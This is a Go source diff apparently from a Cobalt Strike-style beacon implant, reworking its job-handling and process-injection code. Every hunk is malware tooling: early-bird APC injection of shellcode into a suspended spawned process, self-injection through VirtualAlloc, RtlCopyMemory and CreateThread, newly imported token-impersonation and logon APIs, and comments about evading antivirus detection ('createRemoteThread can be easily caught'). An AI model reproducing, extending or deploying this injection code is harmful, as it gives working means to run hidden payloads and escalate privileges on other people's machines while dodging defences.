@@ -15,29 +15,21 @@ import (
 	"unsafe"
 )
 
+// use windows packet as much as possible
 var (
-	kernel32            = windows.NewLazySystemDLL("kernel32.dll")
-	ntdll               = windows.NewLazyDLL("ntdll.dll")
-	VirtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
-	VirtualProtectEx    = kernel32.NewProc("VirtualProtectEx")
-	WriteProcessMemory  = kernel32.NewProc("WriteProcessMemory")
-	QueueUserAPC        = kernel32.NewProc("QueueUserAPC")
-	VirtualAlloc        = kernel32.NewProc("VirtualAlloc")
-	VirtualProtect      = kernel32.NewProc("VirtualProtect")
-	RtlCopyMemory       = ntdll.NewProc("RtlCopyMemory")
-	CreateThread        = kernel32.NewProc("CreateThread")
-	WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
-)
-
-const (
-	// MEM_COMMIT is a Windows constant used with Windows API calls
-	MEM_COMMIT = 0x1000
-	// MEM_RESERVE is a Windows constant used with Windows API calls
-	MEM_RESERVE = 0x2000
-	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
-	PAGE_EXECUTE_READ = 0x20
-	// PAGE_READWRITE is a Windows constant used with Windows API calls
-	PAGE_READWRITE = 0x04
+	kernel32                = windows.NewLazySystemDLL("kernel32.dll")
+	ntdll                   = windows.NewLazyDLL("ntdll.dll")
+	advapi32                = windows.NewLazyDLL("Advapi32.dll")
+	virtualAllocEx          = kernel32.NewProc("VirtualAllocEx")
+	virtualProtectEx        = kernel32.NewProc("VirtualProtectEx")
+	queueUserAPC            = kernel32.NewProc("QueueUserAPC")
+	rtlCopyMemory           = ntdll.NewProc("RtlCopyMemory")
+	createThread            = kernel32.NewProc("CreateThread")
+	createProcessWithLogonW = advapi32.NewProc("CreateProcessWithLogonW")
+	createProcessWithTokenW = advapi32.NewProc("CreateProcessWithTokenW")
+	adjustTokenPrivileges   = advapi32.NewProc("AdjustTokenPrivileges")
+	impersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
+	logonUserA              = advapi32.NewProc("LogonUserA")
 )
 
 // implement of beacon.Job
@@ -117,78 +109,79 @@ func SpawnAndInjectDll(dll []byte, program string, args string) error {
 		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
 		ShowWindow: 1,
 	}
-	errCreateProcess := windows.CreateProcess(windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
-	if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
+	errCreateProcess := CreateProcessNative(windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
+	if errCreateProcess != nil && errCreateProcess != windows.SEVERITY_SUCCESS {
 		return errors.New(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
 	}
-	return CallUserAPC(procInfo, dll)
+	return callUserAPC(procInfo, dll)
+
+	// createRemoteThread can be easily caught, you should never use it
+	//return createRemoteThread(procInfo, dll)
 }
 
 // copy from GolangBypassAV EarlyBird
-func CallUserAPC(procInfo *windows.ProcessInformation, shellcode []byte) error {
-	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+func callUserAPC(procInfo *windows.ProcessInformation, shellcode []byte) error {
+	addr, _, errVirtualAlloc := virtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 
-	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
-		return errors.New(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
+	if errVirtualAlloc != nil && errVirtualAlloc != windows.SEVERITY_SUCCESS {
+		return errors.New(fmt.Sprintf("VirtualAlloc error: %s", errVirtualAlloc))
 	}
-	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-
-	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
-		return errors.New(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
+	var length uintptr
+	errWriteProcessMemory := windows.WriteProcessMemory(procInfo.Process, addr, &shellcode[0], uintptr(len(shellcode)), &length)
+	if errWriteProcessMemory != nil {
+		return errors.New(fmt.Sprintf("WriteProcessMemory error: %s", errWriteProcessMemory))
 	}
 	oldProtect := windows.PAGE_READWRITE
-	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
-	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
-		return errors.New(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
+	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	if errVirtualProtectEx != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
+		return errors.New(fmt.Sprintf("VirtualProtectEx error: %s", errVirtualProtectEx))
 	}
-	_, _, err := QueueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)
-	if err != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
-		return errors.New(fmt.Sprintf("[!]Error calling QueueUserAPC:\n%s", err.Error()))
+	_, _, err := queueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)
+	if err != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
+		return errors.New(fmt.Sprintf("QueueUserAPC error: %s", err))
 	}
 	_, errResumeThread := windows.ResumeThread(procInfo.Thread)
 	if errResumeThread != nil {
-		return errors.New(fmt.Sprintf("[!]Error calling ResumeThread:\r\n%s", errResumeThread.Error()))
+		return errors.New(fmt.Sprintf("ResumeThread error: %s", errResumeThread))
 	}
 	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
 	if errCloseThreadHandle != nil {
-		return errors.New(fmt.Sprintf("[!]Error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle.Error()))
+		return errors.New(fmt.Sprintf("CloseHandle error: %s", errCloseThreadHandle.Error()))
 	}
 	return nil
 }
 
 // copy from GolangBypassAV CreateThreadNative
 func InjectSelf(shellcode []byte) error {
-	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
-	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
-		return errors.New(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
+	addr, err := windows.VirtualAlloc(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if err != nil {
+		return errors.New(fmt.Sprintf("VirtualAlloc error: %s", err.Error()))
 	}
 
 	if addr == 0 {
-		return errors.New("[!]VirtualAlloc failed and returned 0")
+		return errors.New("VirtualAlloc failed and returned 0")
 	}
 
-	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+	_, _, errRtlCopyMemory := rtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 
-	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
-		return errors.New(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
+	if errRtlCopyMemory != nil && errRtlCopyMemory != windows.SEVERITY_SUCCESS {
+		return errors.New(fmt.Sprintf("RtlCopyMemory error: %s", errRtlCopyMemory.Error()))
 	}
+	oldProtect := uint32(windows.PAGE_READWRITE)
+	err = windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
+	if err != nil {
+		return errors.New(fmt.Sprintf("VirtualProtect error: %s", err.Error()))
 
-	oldProtect := PAGE_READWRITE
-	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
-	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
-		return errors.New(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
 	}
-
 	//var lpThreadId uint32
-	thread, _, errCreateThread := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
+	thread, _, errCreateThread := createThread.Call(0, 0, addr, uintptr(0), 0, 0)
 
-	if errCreateThread != nil && errCreateThread.Error() != "The operation completed successfully." {
-		return errors.New(fmt.Sprintf("[!]Error calling CreateThread:\r\n%s", errCreateThread.Error()))
+	if errCreateThread != nil && errCreateThread != windows.SEVERITY_SUCCESS {
+		return errors.New(fmt.Sprintf("CreateThread error: %s", errCreateThread.Error()))
 	}
-
-	_, _, errWaitForSingleObject := WaitForSingleObject.Call(thread, 0xFFFFFFFF)
-	if errWaitForSingleObject != nil && errWaitForSingleObject.Error() != "The operation completed successfully." {
-		return errors.New(fmt.Sprintf("[!]Error calling WaitForSingleObject:\r\n:%s", errWaitForSingleObject.Error()))
+	_, err = windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
+	if err != nil {
+		return errors.New(fmt.Sprintf("WaitForSingleObject error: %s", err.Error()))
 	}
 	return nil
 }
@@ -207,8 +200,9 @@ func HandlerJob(b []byte) error {
 	pipeName, _ := ParseAnArg(buf)
 	// command type, seems useless?
 	_, _ = ParseAnArg(buf)
-	// sleep time is 30000, I think it's too big, so just set time unit microsecond
-	time.Sleep(time.Microsecond * time.Duration(sleepTime))
+	// sleep time is 1
+	fmt.Printf("Sleep time: %d\n", sleepTime)
+	time.Sleep(time.Second * time.Duration(sleepTime))
 	result, err := ReadNamedPipe(pipeName)
 	if err != nil {
 		return err
@@ -230,7 +224,7 @@ func ReadNamedPipe(pipeName []byte) (string, error) {
 		n, err := pipe.Read(buf)
 		if err != nil {
 			if err != io.EOF && err != windows.ERROR_PIPE_NOT_CONNECTED {
-				fmt.Printf("read error: %v\n", err)
+				return "", err
 			}
 			break
 		}
